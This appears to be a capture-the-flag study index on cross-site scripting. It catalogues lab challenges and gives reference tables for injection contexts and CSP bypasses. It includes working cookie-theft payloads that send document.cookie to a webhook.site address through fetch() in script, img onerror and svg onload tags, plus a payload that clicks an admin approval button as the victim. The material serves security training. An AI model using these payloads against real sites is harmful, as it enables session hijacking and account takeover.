# Cross-Site Scripting (XSS)

XSS challenges spanning reflected, stored, and DOM-based vectors, with progressive defenses including sanitizers, Content Security Policy (CSP), and HttpOnly cookies. Harder challenges require chaining XSS with CSRF, SSRF, or file upload vulnerabilities.

## Challenges

| challenge | xss type | defenses present | key technique |
|---|---|---|---|
| [portswigger - Reflected XSS](<portswigger - Reflected XSS into HTML context.md>) | reflected | none | Basic `<script>alert(1)</script>` in HTML context |
| [Segnalazione cinghiali - Attribute Context](<Segnalazione cinghiali cittadini - Attribute Context XSS.md>) | reflected | none | `" onmouseover="...` breaks out of attribute; event handler fires |
| [ScratchPad - JS String Context](<ScratchPad - Stored XSS via JavaScript String Context.md>) | stored | none | `'; payload;//` closes string literal, injects JS |
| [Guestbook - javascript: URI Bypass](<Guestbook - XSS via javascript, URI Sanitizer Bypass.md>) | stored | sanitizer | `javascript:` URI survives sanitization; executes on click |
| [Curious George - Cookie Theft](<Curious George - stored XSS and cookie theft.md>) | stored | proof-of-work rate limit | `fetch('https://webhook.site/...?c='+document.cookie)` exfiltrates cookie |
| [Bibbopedia 2 - Action as Victim](<Bibbopedia 2 - Stored XSS.md>) | stored | HttpOnly cookies | `onerror` handler clicks the admin approval button — action as victim bypasses HttpOnly |
| [RecipeBox - SSRF + Reflected XSS](<RecipeBox - SSRF + Reflected XSS and Cookie Theft.md>) | reflected | none | SSRF triggers server to visit a page; reflected XSS on that page steals the server-side cookie |
| [PigeonPost - postMessage Bypass](<PigeonPost - postMessage Origin Bypass and javascript URI Cookie Theft.md>) | DOM | none | `postMessage` handler lacks origin check; inject `javascript:` payload to steal cookie |
| [PicShare - SVG Upload XSS](<PicShare - Stored XSS via SVG Upload and Missing X-Content-Type-Options.md>) | stored, file upload | none | SVG avatar served without `X-Content-Type-Options`; browser executes embedded `<script>` |
| [Virtualbank - CSP 'self' Bypass](<Virtualbank - CSP 'self' bypass.md>) | stored | CSP with `'self'` | Same-origin script injection route circumvents `script-src 'self'` |
| [Private Notes - CSP Nonce Predictability](<Private Notes - CSP nonce predictability.md>) | stored | CSP with nonce | Nonce is predictable or reusable; forged `<script nonce="...">` passes CSP |

## Cookie Theft Payloads

**Standard fetch exfiltration (when HttpOnly is not set):**
```html
<script>fetch('https://webhook.site/YOUR-UUID?c='+document.cookie)</script>
```

**Alternative vectors (when `<script>` is filtered):**
```html
<img src=x onerror="fetch('https://webhook.site/UUID?c='+document.cookie)">
<svg onload="fetch('https://webhook.site/UUID?c='+document.cookie)">
```

**When HttpOnly is set — action as victim (Bibbopedia 2 pattern):**
```html
<img src=x onerror="document.getElementsByName('approval_btn')[0].click()">
```
The admin bot's browser executes this; the HttpOnly cookie is sent automatically in the resulting request.

## CSP Bypass Reference

| CSP directive | weakness | bypass |
|---|---|---|
| `script-src 'self'` | Same-origin user content is trusted | Upload a JS file or find a JSONP endpoint on the same origin |
| `script-src 'nonce-XYZ'` | Nonce is predictable or static | Reuse the nonce in an injected `<script nonce="XYZ">` |
| `script-src 'unsafe-inline'` | Inline scripts allowed | Direct `<script>` injection |

## Injection Context Reference

| context | escape sequence | example payload |
|---|---|---|
| HTML body | `<` | `<script>alert(1)</script>` |
| HTML attribute | `"` or `'` | `" onmouseover="alert(1)` |
| JavaScript string (single) | `'` | `'; alert(1); //` |
| JavaScript string (double) | `"` | `"; alert(1); //` |
| href/src attribute | `javascript:` | `javascript:alert(document.cookie)` |
